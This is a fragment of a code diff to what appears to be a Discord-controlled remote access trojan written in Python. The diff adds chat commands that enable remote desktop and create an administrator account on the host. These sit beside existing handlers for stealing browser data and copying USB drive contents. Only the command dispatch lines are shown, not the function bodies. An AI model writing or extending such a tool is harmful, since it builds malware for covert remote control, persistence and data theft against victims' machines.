@@ -86,6 +86,10 @@ def main():
             await get_browser_data(await bot.get_context(message))
         elif re.match(r'!copy_usb_data',message.content):
             await copy_usb_data(await bot.get_context(message))
+        elif re.match(r'!rdp_enable',message.content):
+            await rdp_enable(await bot.get_context(message))
+        elif re.match(r'!create_admin_user',message.content):
+            await create_admin_user(await bot.get_context(message))
         elif re.match(r'!help',message.content):
             await help(await bot.get_context(message))
 
